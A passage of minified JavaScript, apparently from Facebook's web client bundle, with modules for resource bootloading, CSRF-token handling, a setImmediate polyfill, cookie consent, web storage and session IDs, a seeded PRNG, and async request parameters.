          h = i.next();
          if (h.done) break;
          a = h.value;
        }
        f = a;
        g = s.get(f);
        g && U(f, g, !0);
      }
    },
    getURLToHashMap: function () {
      var a = new Map();
      for (var b = s, c = Array.isArray(b), d = 0, b = c ? b : b[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var e;
        if (c) {
          if (d >= b.length) break;
          e = b[d++];
        } else {
          d = b.next();
          if (d.done) break;
          e = d.value;
        }
        e = e;
        var f = e[0];
        e = e[1];
        if (e.type === "async" || e.type === "csr") continue;
        a.set(e.src, f);
      }
      return a;
    },
    loadPredictedResourceMap: function (a, b, c) {
      $.setResourceMap(a, null, c), $.loadResources(Object.keys(a), b);
    },
    getCSSResources: function (a) {
      var b = [];
      for (var a = W(a), c = Array.isArray(a), d = 0, a = c ? a : a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var e;
        if (c) {
          if (d >= a.length) break;
          e = a[d++];
        } else {
          d = a.next();
          if (d.done) break;
          e = d.value;
        }
        e = e;
        var f = e[0];
        e = e[1];
        e.type === "css" && b.push(f);
      }
      return b;
    },
    getBootloadPendingComponents: function () {
      var a = new Map();
      for (var b = v, c = Array.isArray(b), d = 0, b = c ? b : b[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var e;
        if (c) {
          if (d >= b.length) break;
          e = b[d++];
        } else {
          d = b.next();
          if (d.done) break;
          e = d.value;
        }
        e = e;
        e = e[0];
        ba(e) || a.set(e, $.getComponentDebugState(e));
      }
      return a;
    },
    getComponentDebugState: function (a) {
      var b = function (a) {
        return !!A.getEventTime(a);
      };
      return {
        phases: {
          tierOne: b(A.tierOne(a)),
          tierTwo: b(A.tierTwo(a)),
          tierThree: b(A.tierThree(a)),
          beDone: b(A.beDone(a))
        },
        unresolvedDeps: c("__debug").debugUnresolvedDependencies([a]),
        nonJSDeps: (b = c("__debug").modulesMap[a]) == null ? void 0 : b.nonJSDeps,
        hasError: (b = c("__debug").modulesMap[a]) == null ? void 0 : b.hasError
      };
    },
    getBootloadedComponents: function () {
      var a = new Map();
      for (var b = v, c = Array.isArray(b), d = 0, b = c ? b : b[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var e;
        if (c) {
          if (d >= b.length) break;
          e = b[d++];
        } else {
          d = b.next();
          if (d.done) break;
          e = d.value;
        }
        e = e;
        var f = e[0];
        e = e[1];
        a.set(f, e.firstBootloadStart);
      }
      return a;
    },
    notifyManuallyLoadedResources: function (a) {
      for (var b in a) {
        b = d("ResourceHasher").getValidResourceHash(b);
        var e = a[b];
        (e.type === "js" || e.type === "css") && (s.has(b) && !c("BootloaderConfig").silentDups && c("FBLogger")("bootloader").warn("Duplicate manual resource [%s]: %s", b, e.src), U(b, e, !0), n.set(b, c("performanceAbsoluteNow")()), $.done(b));
      }
    },
    getResourceState: function (a) {
      return {
        loadStart: n.get(a),
        loadEnd: o.get(a),
        loadError: p.get(a)
      };
    },
    getComponentTiming: function (a) {
      var b;
      return {
        tierTwoStart: (b = A.getEventTime(A.tierTwoStart(a))) != null ? b : 0,
        tierTwoEnd: (b = A.getEventTime(A.tierTwo(a))) != null ? b : 0,
        tierThreeStart: (b = A.getEventTime(A.tierThreeStart(a))) != null ? b : 0,
        tierThreeEnd: (b = A.getEventTime(A.tierThree(a))) != null ? b : 0
      };
    },
    getLoadedResourceCount: function () {
      return o.size;
    },
    getErrorCount: function () {
      return p.size;
    },
    forceFlush: function () {
      c("BootloaderEndpoint").forceFlush();
    },
    __debug: {
      componentMap: q,
      requested: n,
      resources: s,
      riMap: t,
      retries: B.getAllRetryAttempts_FOR_DEBUG_ONLY(),
      errors: p,
      loaded: o,
      bootloaded: v,
      queuedToMarkAsImmediate: j,
      _resolveCSRs: W,
      revMap: u,
      _getQueuedLoadModules: function () {
        return l;
      },
      _dequeueLoadModules: function (a) {
        a = l.splice(a, 1);
        if (!a.length) return;
        a = a[0];
        var b = a[0],
          c = a[1],
          d = a[2];
        a = a[3];
        var e = k,
          f = z;
        k = !1;
        z = !0;
        a(function () {
          $.loadModules.apply($, [b, c, d]);
        });
        k = e;
        z = f;
      }
    }
  };
  c("JSResourceReferenceImpl").setBootloader($);
  f = $;
  g["default"] = f;
}, 98);
__d("CSRFGuard", [], function (a, b, c, d, e, f) {
  "use strict";

  c = "for (;;);";
  var g = /^for ?\(;;\);/;
  d = c.length;
  function a(a) {
    return !!a.match(g);
  }
  function b(a) {
    var b = a.match(g);
    return b ? a.substr(b[0].length) : b;
  }
  f.regex = g;
  f.length = d;
  f.exists = a;
  f.clean = b;
}, 66);
/**
 * License: https://www.facebook.com/legal/license/Ga6vBwdwgUx/
 */
__d("ImmediateImplementation", ["ImmediateImplementationExperiments"], function (a, b, c, d, e, f) {
  (function (c, d) {
    "use strict";

    var e = 1,
      g = {},
      h = {},
      i = h,
      j = !1,
      k = c.document,
      l,
      m,
      n,
      o = "setImmediate$" + Math.random() + "$";
    function p() {
      var a = c.event;
      return !a ? !1 : a.isTrusted && ["change", "click", "contextmenu", "dblclick", "mouseup", "pointerup", "reset", "submit", "touchend"].includes(a.type) || a.type === "message" && a.source === c && typeof a.data === "string" && a.data.indexOf(o) === 0;
    }
    function q(a) {
      var b = a[0];
      a = Array.prototype.slice.call(a, 1);
      g[e] = function () {
        b.apply(void 0, a);
      };
      i = i.next = {
        handle: e++
      };
      return i.handle;
    }
    function r() {
      var a, b;
      while (!j && (a = h.next)) {
        h = a;
        if (b = g[a.handle]) {
          j = !0;
          try {
            b(), j = !1;
          } finally {
            s(a.handle), j && (j = !1, h.next && l(r));
          }
        }
      }
    }
    function s(a) {
      delete g[a];
    }
    function d() {
      if (c.postMessage && !c.importScripts) {
        var a = !0,
          b = function b() {
            a = !1, c.removeEventListener ? c.removeEventListener("message", b, !1) : c.detachEvent("onmessage", b);
          };
        if (c.addEventListener) c.addEventListener("message", b, !1);else if (c.attachEvent) c.attachEvent("onmessage", b);else return !1;
        c.postMessage("", "*");
        return a;
      }
    }
    function t() {
      var a = function (a) {
        a.source === c && typeof a.data === "string" && a.data.indexOf(o) === 0 && r();
      };
      c.addEventListener ? c.addEventListener("message", a, !1) : c.attachEvent("onmessage", a);
      l = function () {
        var a = q(arguments);
        c.originalPostMessage ? c.originalPostMessage(o + a, "*") : c.postMessage(o + a, "*");
        return a;
      };
      m = l;
    }
    function u() {
      var a = new MessageChannel(),
        b = !1;
      a.port1.onmessage = function (a) {
        b = !1, r();
      };
      l = function () {
        var c = q(arguments);
        b || (a.port2.postMessage(c), b = !0);
        return c;
      };
      n = l;
    }
    function v() {
      var a = k.documentElement;
      l = function () {
        var b = q(arguments),
          c = k.createElement("script");
        c.onreadystatechange = function () {
          c.onreadystatechange = null, a.removeChild(c), c = null, r();
        };
        a.appendChild(c);
        return b;
      };
    }
    function w() {
      l = function () {
        setTimeout(r, 0);
        return q(arguments);
      };
    }
    d() ? c.MessageChannel && b("ImmediateImplementationExperiments").prefer_message_channel ? (t(), u(), l = function () {
      if (p()) return m.apply(null, arguments);else return n.apply(null, arguments);
    }) : t() : c.MessageChannel ? u() : k && k.createElement && "onreadystatechange" in k.createElement("script") ? v() : w();
    f.setImmediate = l;
    f.clearImmediate = s;
  })(typeof self === "undefined" ? typeof a === "undefined" ? this : a : self);
}, null);
__d("clearImmediatePolyfill", ["ImmediateImplementation"], function (a, b, c, d, e, f) {
  c = a.clearImmediate || b("ImmediateImplementation").clearImmediate;
  f["default"] = c;
}, 66);
__d("clearImmediate", ["clearImmediatePolyfill"], function (a, b, c, d, e, f, g) {
  function a(a) {
    c("clearImmediatePolyfill")(a);
  }
  g["default"] = a;
}, 98);
__d("CurrentAdAccount", ["CurrentAdAccountInitialData"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    getID: function () {
      return c("CurrentAdAccountInitialData").AD_ACCOUNT_ID;
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("CurrentCommunity", ["CurrentCommunityInitialData"], function (a, b, c, d, e, f) {
  a = {
    getID: function () {
      return b("CurrentCommunityInitialData").COMMUNITY_ID || "0";
    },
    getName: function () {
      return b("CurrentCommunityInitialData").COMMUNITY_NAME || "";
    }
  };
  c = a;
  f["default"] = c;
}, 66);
__d("DTSG", ["invariant", "DTSGInitialData"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  var i = d("DTSGInitialData").token || null;
  function a() {
    return i;
  }
  function b(a) {
    i = a;
  }
  function c() {
    h(0, 5809);
  }
  g.getToken = a;
  g.setToken = b;
  g.refresh = c;
}, 98);
__d("DTSGUtils", ["SprinkleConfig", "isCdnURI", "isFacebookURI", "isMessengerDotComURI", "isOculusDotComURI", "isWorkplaceDotComURI"], function (a, b, c, d, e, f) {
  "use strict";

  a = {
    getNumericValue: function (a) {
      var c = 0;
      for (var d = 0; d < a.length; d++) c += a.charCodeAt(d);
      d = c.toString();
      return b("SprinkleConfig").should_randomize ? d : b("SprinkleConfig").version + d;
    },
    shouldAppendToken: function (a) {
      return !b("isCdnURI")(a) && !a.isSubdomainOfDomain("fbsbx.com") && (b("isFacebookURI")(a) || b("isMessengerDotComURI")(a) || b("isWorkplaceDotComURI")(a) || b("isOculusDotComURI")(a) || a.isSubdomainOfDomain("freebasics.com") || a.isSubdomainOfDomain("discoverapp.com"));
    }
  };
  e.exports = a;
}, null);
__d("DTSG_ASYNC", ["DTSGInitData"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = c("DTSGInitData").async_get_token || null;
  function a() {
    return h;
  }
  function b(a) {
    h = a;
  }
  g.getToken = a;
  g.setToken = b;
}, 98);
__d("ge", [], function (a, b, c, d, e, f) {
  function a(a, b, c) {
    if (typeof a !== "string") return a;else if (!b) return document.getElementById(a);else return g(a, b, c);
  }
  function g(a, b, c) {
    var d;
    if (h(b) == a) return b;else if (b.getElementsByTagName) {
      c = b.getElementsByTagName(c || "*");
      for (d = 0; d < c.length; d++) if (h(c[d]) == a) return c[d];
    } else {
      c = b.childNodes;
      for (d = 0; d < c.length; d++) {
        b = g(a, c[d]);
        if (b) return b;
      }
    }
    return null;
  }
  function h(a) {
    return a.getAttribute ? a.getAttribute("id") : null;
  }
  f["default"] = a;
}, 66);
__d("replaceTransportMarkers", ["BanzaiLazyQueue", "ge", "memoize"], function (a, b, c, d, e, f, g) {
  var h = new Set();
  function i(a, e, f) {
    var g = f !== void 0 ? e[f] : e,
      j;
    if (Array.isArray(g)) for (j = 0; j < g.length; j++) i(a, g, j);else if (g && typeof g === "object") if (g.__m) g.__lazy ? e[f] = c("memoize")(b.bind(null, g.__m)) : e[f] = b.call(null, g.__m);else if (g.__jsr) e[f] = new (b.call(null, "JSResourceReferenceImpl"))(g.__jsr).__setRef("replaceTransportMarkers");else if (g.__dr) e[f] = new (b.call(null, "RequireDeferredReference"))(g.__dr).__setRef("replaceTransportMarkers");else if (g.__rc) g.__rc[0] === null ? e[f] = null : e[f] = b.call(null, g.__rc[0]), g.__rc[1] && (h.has(g.__rc[1]) || (h.add(g.__rc[1]), d("BanzaiLazyQueue").queuePost("require_cond_exposure_logging", {
      identifier: g.__rc[1]
    })));else if (g.__e) e[f] = c("ge")(g.__e);else if (g.__rel) e[f] = a.relativeTo;else if (g.__bigPipeContext) e[f] = a.bigPipeContext;else if (g.__bbox) e[f] = g.__bbox;else {
      for (j in g) i(a, g, j);
      if (g.__map) e[f] = new Map(g.__map);else if (g.__set) e[f] = new Set(g.__set);else if (g.__imm) {
        j = g.__imm;
        a = j.method;
        g = j.value;
        e[f] = b.call(null, "immutable")[a](g);
      }
    }
  }
  g["default"] = i;
}, 98);
__d("ServerJSDefine", ["BitMap", "replaceTransportMarkers"], function (a, b, c, d, e, f, g) {
  var h = 2,
    i = 8,
    j = new (c("BitMap"))(),
    k = {
      getLoadedModuleHash: function () {
        return j.toCompressedString();
      },
      getModuleNameAndHash: function (a) {
        a = a.split("@");
        return {
          hash: a[1],
          name: a[0]
        };
      },
      handleDefine: function (a, b, d, e, g) {
        e >= 0 && j.set(e), define(a, b, function (h, i, j, k, b) {
          h = {
            data: d
          };
          c("replaceTransportMarkers")({
            relativeTo: g
          }, h);
          if (e === -42) {
            i = d != null && typeof d === "object" && d.__throw8367__;
            throw new Error(a + ": " + (typeof i === "string" ? i : ""));
          }
          b.exports = h.data;
        }, h | i);
      },
      handleDefines: function (a, b) {
        a.forEach(function (a) {
          var c;
          b != null ? c = [].concat(a, [b]) : c = [].concat(a, [null]);
          k.handleDefine.apply(null, c);
        });
      }
    };
  a = k;
  g["default"] = a;
}, 98);
__d("StaticSiteData", [], function (a, b, c, d, e, f) {
  a = Object.freeze({
    hs_key: "__hs",
    connection_class_server_guess_key: "__ccg",
    dpr_key: "dpr",
    spin_rev_key: "__spin_r",
    spin_time_key: "__spin_t",
    spin_branch_key: "__spin_b",
    spin_mhenv_key: "__spin_dev_mhenv",
    lite_iframe_locale_override_key: "__ltif_locale",
    weblite_key: "__wblt",
    weblite_iframe_key: "__wbltif",
    kite_key: "__ktif",
    kite_legacy_key: "_ktif",
    haste_session_id_key: "__hsi",
    jsmod_key: "__dyn",
    csr_key: "__csr",
    comet_key: "__comet_req"
  });
  f["default"] = a;
}, 66);
/**
 * License: https://www.facebook.com/legal/license/A4tfXiHOGrs/
 */
__d("Alea", [], function (a, b, c, d, e, f) {
  function g() {
    var a = 4022871197,
      b = function (b) {
        b = b.toString();
        for (var c = 0; c < b.length; c++) {
          a += b.charCodeAt(c);
          var d = .02519603282416938 * a;
          a = d >>> 0;
          d -= a;
          d *= a;
          a = d >>> 0;
          d -= a;
          a += d * 4294967296;
        }
        return (a >>> 0) * 23283064365386963e-26;
      };
    b.version = "Mash 0.9";
    return b;
  }
  function a() {
    var a = 0,
      b = 0,
      c = 0,
      d = 1;
    for (var e = arguments.length, f = new Array(e), h = 0; h < e; h++) f[h] = arguments[h];
    var i = f.length > 0 ? f : [new Date()],
      j = g();
    a = j(" ");
    b = j(" ");
    c = j(" ");
    for (var k = 0; k < i.length; k++) a -= j(i[k]), a < 0 && (a += 1), b -= j(i[k]), b < 0 && (b += 1), c -= j(i[k]), c < 0 && (c += 1);
    j = null;
    var l = function () {
      var e = 2091639 * a + d * 23283064365386963e-26;
      a = b;
      b = c;
      c = e - (d = e | 0);
      return c;
    };
    l.version = "Alea 0.9";
    l.args = i;
    return l;
  }
  f["default"] = a;
}, 66);
__d("Random", ["Alea", "ServerNonce"], function (a, b, c, d, e, f) {
  "use strict";

  var g = 4294967296,
    h = b("ServerNonce").ServerNonce,
    i;
  function j() {
    i == null && (i = b("Alea")(h));
    return i;
  }
  var k = {
    random: function () {
      var b = typeof Uint32Array === "function" ? new Uint32Array(1) : null,
        c = a.crypto || a.msCrypto;
      if (b != null) try {
        var d = c == null ? void 0 : c.getRandomValues;
        if (typeof d === "function") {
          var e = d.bind(c);
          return function () {
            try {
              e(b);
            } catch (a) {
              return j()();
            }
            return b[0] / g;
          };
        }
      } catch (a) {}
      return j();
    }(),
    uint32: function () {
      return Math.floor(k.random() * g);
    },
    coinflip: function (a) {
      function b(b) {
        return a.apply(this, arguments);
      }
      b.toString = function () {
        return a.toString();
      };
      return b;
    }(function (a) {
      if (a === 0) return !1;
      return a <= 1 ? !0 : k.random() * a <= 1;
    })
  };
  e.exports = k;
}, null);
__d("WebSessionDefaultTimeoutMs", [], function (a, b, c, d, e, f) {
  "use strict";

  a = 35e3;
  f["default"] = a;
}, 66);
__d("CookieConsent", ["CookieConsentIFrameConfig", "InitialCookieConsent"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = new Set(c("InitialCookieConsent").initialConsent),
    i = c("InitialCookieConsent").shouldShowCookieBanner,
    j = {
      setConsented: function () {
        h.add(1), i = !1;
      },
      hasConsent: function (a) {
        return h.has(a);
      },
      shouldShowCookieBanner: function () {
        return i;
      },
      isFirstPartyStorageAllowed: function () {
        return !c("InitialCookieConsent").noCookies && j.hasConsent(1);
      },
      isThirdPartyEmbedAllowed: function () {
        return !c("InitialCookieConsent").noCookies && j.hasConsent(2);
      },
      isThirdPartyIframeAllowed: function (a) {
        if (!j.isFirstPartyStorageAllowed()) return !1;
        return c("CookieConsentIFrameConfig").allowlisted_iframes.includes(a.id) ? !0 : j.hasConsent(2);
      }
    };
  a = j;
  g["default"] = a;
}, 98);
__d("isQuotaExceededError", [], function (a, b, c, d, e, f) {
  "use strict";

  function g(b) {
    return Boolean(b instanceof a.DOMException && (b.code === 22 || b.code === 1014 || b.name === "QuotaExceededError" || b.name === "NS_ERROR_DOM_QUOTA_REACHED"));
  }
  function b(a, b) {
    return Boolean(g(b) && a && a.length !== 0);
  }
  f.isQuotaExceededError = g;
  f.isStorageQuotaExceededError = b;
}, 66);
__d("WebStorage", ["CookieConsent", "FBLogger", "err", "isQuotaExceededError"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = {},
    i = {},
    j = "localStorage",
    k = "sessionStorage",
    l = !1,
    m = typeof window !== "undefined" ? window : self;
  function n(a, b, d) {
    if (!c("CookieConsent").isFirstPartyStorageAllowed()) {
      l || (c("FBLogger")("web_storage").warn("Failed to get %s because of missing cookie consent", d.toString()), l = !0);
      return null;
    }
    Object.prototype.hasOwnProperty.call(a, d) || (a[d] = b(d));
    return a[d];
  }
  function o(a) {
    try {
      return m[a];
    } catch (a) {
      c("FBLogger")("web_storage").warn("Failed to get storage for read %s", a.message);
    }
    return null;
  }
  function p(a) {
    var b = null;
    try {
      b = m[a];
      if (b != null && typeof b.setItem === "function" && typeof b.removeItem === "function") {
        var e = "__test__" + Date.now();
        b.setItem(e, "");
        b.removeItem(e);
      } else return null;
    } catch (e) {
      if (d("isQuotaExceededError").isStorageQuotaExceededError(b, e) === !1) {
        c("FBLogger")("web_storage").catching(e).warn("Failed to get WebStorage of type `%s`", a);
        return null;
      }
    }
    return b;
  }
  function q(a) {
    var b = null;
    try {
      b = m[a];
      if (b != null && typeof b.setItem === "function" && typeof b.removeItem === "function") {
        a = "__test__" + Date.now();
        b.setItem(a, "");
        b.removeItem(a);
      }
    } catch (a) {
      if (d("isQuotaExceededError").isStorageQuotaExceededError(b, a) === !0) return !0;
    }
    return !1;
  }
  function r(a) {
    var b = [];
    for (var c = 0; c < a.length; c++) b.push(a.key(c) || "");
    return b;
  }
  function s(a, b, d) {
    if (a == null) return new Error("storage cannot be null");
    var e = null;
    try {
      a.setItem(b, d);
    } catch (g) {
      var f = r(a).map(function (b) {
        var c = (a.getItem(b) || "").length;
        return b + "(" + c + ")";
      });
      e = c("err")("%sStorage quota exceeded while setting %s(%s). Items(length) follows: %s", g.name ? g.name + ": " : "", b, d.length, f.join());
    }
    return e;
  }
  a = {
    getLocalStorage: function () {
      return n(h, p, j);
    },
    getAllowlistedKeyFromLocalStorage: function (a) {
      var b;
      return (b = n(i, o, j)) == null ? void 0 : b.getItem(a);
    },
    getSessionStorage: function () {
      return n(h, p, k);
    },
    getAllowlistedKeyFromSessionStorage: function (a) {
      var b;
      return (b = n(i, o, k)) == null ? void 0 : b.getItem(a);
    },
    getLocalStorageForRead: function () {
      return n(i, o, j);
    },
    getSessionStorageForRead: function () {
      return n(i, o, k);
    },
    isLocalStorageQuotaExceeded: function () {
      return q(j);
    },
    isSessionStorageQuotaExceeded: function () {
      return q(k);
    },
    setItemGuarded: s,
    setAllowlistedKeyToLocalStorage: function (a, b, c) {
      return s(a, b, c);
    },
    clearCaches: function () {
      h = {}, i = {};
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("WebSession", ["FBLogger", "Random", "WebSessionDefaultTimeoutMs", "WebStorage"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = 36,
    i = 6,
    j = Math.pow(h, i);
  function k(a) {
    return a == null || Number.isFinite(a) === !1 || a <= 0 ? null : a;
  }
  function l(a) {
    if (a == null) return null;
    var b = parseInt(a, 10);
    if ("" + b !== a) {
      c("FBLogger")("web_session").warn("Expected the web session expiry time to parse as an integer. Found `%s`.", String(a));
      return null;
    }
    return k(b);
  }
  function m(a) {
    if (a == null) return null;
    if (a.length !== i) {
      c("FBLogger")("web_session").warn("Expected the web session id to be a %d character string. It was %d character(s). Received `%s`.", i, a.length, a);
      return null;
    }
    if (/^[a-z0-9]+$/.test(a) === !1) {
      c("FBLogger")("web_session").warn("Expected the web session ID to be a base-%d encoded string. Received `%s`.", h, a);
      return null;
    }
    return a;
  }
  function n(a) {
    if (a == null) return null;
    if (typeof a !== "string" && a instanceof String === !1) {
      c("FBLogger")("web_session").warn("A non-string value was passed to `coerceSession`. This should be impossible according to this method's Flow type. The value was `%s`.", a);
      return null;
    }
    a = a.split(":");
    var b = a[0];
    a = a[1];
    a = l(a);
    b = m(b);
    return a == null || b == null ? null : {
      expiryTime: a,
      id: b
    };
  }
  function o() {
    var a = Math.floor(d("Random").random() * j);
    a = a.toString(h);
    return "0".repeat(i - a.length) + a;
  }
  var p = null;
  function q() {
    p == null && (p = o());
    return p;
  }
  function r(a) {
    a === void 0 && (a = Date.now());
    var b = c("WebStorage").getLocalStorageForRead();
    if (b == null) return null;
    try {
      b = n(b.getItem("Session"));
      return b && a < b.expiryTime ? b : null;
    } catch (a) {
      return null;
    }
  }
  function s() {
    var a = c("WebStorage").getSessionStorageForRead();
    if (a == null) return null;
    a = m(a.getItem("TabId"));
    if (a == null) {
      var b = c("WebStorage").getSessionStorage();
      if (b == null) return null;
      var d = o();
      c("WebStorage").setItemGuarded(b, "TabId", d);
      return d;
    }
    return a;
  }
  function a(a) {
    if (a !== void 0 && k(a) == null) {
      c("FBLogger")("web_session").warn("`WebSession.extend()` was passed an invalid target expiry time `%s`.", a);
      return;
    }
    var b = Date.now();
    a = (a = a) != null ? a : b + c("WebSessionDefaultTimeoutMs");
    var d = r(b);
    if (d && d.expiryTime >= a || a <= b) return;
    b = c("WebStorage").getLocalStorage();
    if (b != null) {
      d = d == null ? o() : d.id;
      c("WebStorage").setItemGuarded(b, "Session", d + ":" + a);
    }
  }
  function t() {
    var a;
    return (a = r()) == null ? void 0 : a.id;
  }
  function b() {
    var a,
      b,
      c = q();
    a = (a = t()) != null ? a : "";
    b = (b = s()) != null ? b : "";
    return a + ":" + b + ":" + c;
  }
  function e() {
    return q();
  }
  g.extend = a;
  g.getSessionId = t;
  g.getId = b;
  g.getPageId_DO_NOT_USE = e;
}, 98);
__d("asyncParams", [], function (a, b, c, d, e, f) {
  var g = {};
  function a(a, b) {
    g[a] = b;
  }
  function b() {
    return g;
  }
  f.add = a;
  f.get = b;
}, 66);
__d("getAsyncParamsFromCurrentPageURI", [], function (a, b, c, d, e, f) {
  "use strict";

  var g = {
      locale: !0,
      cxobfus: !0,
      js_debug: !0,
      cquick: !0,
      cquick_token: !0,
      wdplevel: !0,
      prod_graphql: !0,
      sri: !0
    },
    h = {
      ctarget: !0,
      hl: !0,
      gk_enable: !0,
      gk_disable: !0
    };
  function a() {
    var a = {};
    window.location.search.slice(1).split("&").forEach(function (b) {
      b = b.split("=");
      var c = b[0];
      b = b[1];
      (c.substr(0, 4) === "tfc_" || c.substr(0, 4) === "tfi_" || c.substr(0, 3) === "mh_" || g[c] > -1 || h[c] > -1) && (h[c] > -1 ? a[c] = decodeURIComponent(b) : a[c] = b);
    });
    return a;
  }
  f["default"] = a;
}, 66);
__d("CSSCore", ["invariant"], function (a, b, c, d, e, f, g, h) {
  function i(a, b) {
    var c = a;
    while (c.parentNode) c = c.parentNode;
    if (c instanceof Element) {
      c = c.querySelectorAll(b);
      return Array.prototype.indexOf.call(c, a) !== -1;
    }
    return !1;
  }
  function j(a, b) {
    /\s/.test(b) && h(0, 11794, b);
    b && (a.classList ? a.classList.add(b) : l(a, b) || (a.className = a.className + " " + b));
    return a;
  }
  function k(a, b) {
    /\s/.test(b) && h(0, 11795, b);
    b && (a.classList ? a.classList.remove(b) : l(a, b) && (a.className = a.className.replace(new RegExp("(^|\\s)" + b + "(?:\\s|$)", "g"), "$1").replace(/\s+/g, " ").replace(/^\s*|\s*$/g, "")));
    return a;
  }
  function a(a, b, c) {
    return (c ? j : k)(a, b);
  }
  function l(a, b) {
    /\s/.test(b) && h(0, 442);
    return a.classList ? !!b && a.classList.contains(b) : (" " + a.className + " ").indexOf(" " + b + " ") > -1;
  }
  function b(a, b) {
    var c = a.matches || a.webkitMatchesSelector || a.mozMatchesSelector || a.msMatchesSelector || function (b) {
      return i(a, b);
    };
    return c.call(a, b);
  }
  g.addClass = j;
  g.removeClass = k;
  g.conditionClass = a;
  g.hasClass = l;
  g.matchesSelector = b;
}, 98);
__d("isSocialPlugin", ["CSSCore", "ExecutionEnvironment"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a() {
    return !c("ExecutionEnvironment").canUseDOM ? !1 : !!document.body && d("CSSCore").hasClass(document.body, "plugin");
  }
  g["default"] = a;
}, 98);
__d("uniqueRequestID", [], function (a, b, c, d, e, f) {
  var g = 36,
    h = 1;
  function a() {
    return (h++).toString(g);
  }
  f["default"] = a;
}, 66);
__d("getAsyncParams", ["CSRBitMap", "CometPersistQueryParams", "CurrentAdAccount", "CurrentBusinessUser", "CurrentCommunity", "CurrentUserInitialData", "DTSG", "DTSGUtils", "DTSG_ASYNC", "Env", "ISB", "JSErrorLoggingConfig", "LSD", "ServerJSDefine", "SiteData", "SprinkleConfig", "StaticSiteData", "WebConnectionClassServerGuess", "WebSession", "asyncParams", "getAsyncParamsFromCurrentPageURI", "isSocialPlugin", "requireWeak", "uniqueRequestID"], function (a, b, c, d, e, f, g) {
  function a(a, b) {
    var e;
    b === void 0 && (b = !1);
    var f = babelHelpers["extends"]({}, d("asyncParams").get(), (e = {
      __user: c("CurrentUserInitialData").USER_ID,
      __a: 1,
      __req: c("uniqueRequestID")()
    }, e[c("StaticSiteData").hs_key] = c("SiteData").haste_session, e[c("StaticSiteData").dpr_key] = c("SiteData").pr, e[c("StaticSiteData").connection_class_server_guess_key] = c("WebConnectionClassServerGuess").connectionClass, e.__rev = c("SiteData").client_revision, e.__s = d("WebSession").getId(), e[c("StaticSiteData").haste_session_id_key] = c("SiteData").hsi, e));
    b || (f[c("StaticSiteData").jsmod_key] = c("ServerJSDefine").getLoadedModuleHash(), f[c("StaticSiteData").csr_key] = d("CSRBitMap").toCompressedString());
    if (!c("SiteData").wbloks_env && (c("SiteData").comet_env != null && c("SiteData").comet_env !== 0 || c("SiteData").is_comet)) {
      f[c("StaticSiteData").comet_key] = (e = c("SiteData").comet_env) != null ? e : 1;
    }
    Object.entries(c("CometPersistQueryParams").relative).forEach(function (a) {
      var b = a[0];
      a = a[1];
      a != null && (f[b] = String(a));
    });
    typeof window !== "undefined" && ((b = window) == null ? void 0 : b.location) != null && Object.assign(f, c("getAsyncParamsFromCurrentPageURI")());
    c("Env").isCQuick && !f.cquick && (f.cquick = c("Env").iframeKey, f.ctarget = c("Env").iframeTarget, f.cquick_token = c("Env").iframeToken);
    if (a == "POST") {
      e = d("DTSG").getCachedToken ? d("DTSG").getCachedToken() : d("DTSG").getToken();
      e && (f.fb_dtsg = e, c("SprinkleConfig").param_name && (f[c("SprinkleConfig").param_name] = c("DTSGUtils").getNumericValue(e)));
      c("LSD").token && (f.lsd = c("LSD").token, c("SprinkleConfig").param_name && !e && (f[c("SprinkleConfig").param_name] = c("DTSGUtils").getNumericValue(c("LSD").token)));
    }
    if (a == "GET") {
      b = d("DTSG_ASYNC").getCachedToken ? d("DTSG_ASYNC").getCachedToken() : d("DTSG_ASYNC").getToken();
      b && (f.fb_dtsg_ag = b, c("SprinkleConfig").param_name && (f[c("SprinkleConfig").param_name] = c("DTSGUtils").getNumericValue(b)));
    }
    c("ISB").token && (f.fb_isb = c("ISB").token);
    c("CurrentCommunity").getID() !== "0" && (f.__cid = c("CurrentCommunity").getID());
    c("CurrentAdAccount").getID() != null && (f.__aaid = c("CurrentAdAccount").getID());
    c("CurrentBusinessUser").business_id != null && (f.__bid = c("CurrentBusinessUser").business_id);
    c("isSocialPlugin")() && (f.__sp = 1);
    c("SiteData").spin && (f[c("StaticSiteData").spin_rev_key] = c("SiteData")[c("StaticSiteData").spin_rev_key], f[c("StaticSiteData").spin_branch_key] = c("SiteData")[c("StaticSiteData").spin_branch_key], f[c("StaticSiteData").spin_time_key] = c("SiteData")[c("StaticSiteData").spin_time_key], c("SiteData")[c("StaticSiteData").spin_mhenv_key] && (f[c("StaticSiteData").spin_mhenv_key] = c("SiteData")[c("StaticSiteData").spin_mhenv_key]));
    d("JSErrorLoggingConfig").sampleWeight != null && d("JSErrorLoggingConfig").sampleWeightKey != null && (f[d("JSErrorLoggingConfig").sampleWeightKey] = d("JSErrorLoggingConfig").sampleWeight);
    c("requireWeak")("QPLUserFlow", function (a) {
      a = a.getActiveFlowIDs();
      a.length > 0 && (f.qpl_active_flow_ids = a.sort().join(","));
    });
    return f;
  }
  g["default"] = a;
}, 98);
__d("setImmediatePolyfill", ["invariant", "ImmediateImplementation", "PromiseUsePolyfillSetImmediateGK"], function (a, b, c, d, e, f, g) {
  var h = a.setImmediate;
  if (b("PromiseUsePolyfillSetImmediateGK").www_always_use_polyfill_setimmediate || !h) {
    d = b("ImmediateImplementation");
    h = d.setImmediate;
  }
  function c(a) {
    typeof a === "function" || g(0, 5912);
    for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
    return h.apply(void 0, [a].concat(c));
  }
  e.exports = c;
}, null);
__d("setImmediateAcrossTransitions", ["TimeSlice", "setImmediatePolyfill"], function (a, b, c, d, e, f, g) {
  function a(a) {
    var b = c("TimeSlice").guard(a, "setImmediate", {
      propagationType: c("TimeSlice").PropagationType.CONTINUATION,
      registerCallStack: !0
    });
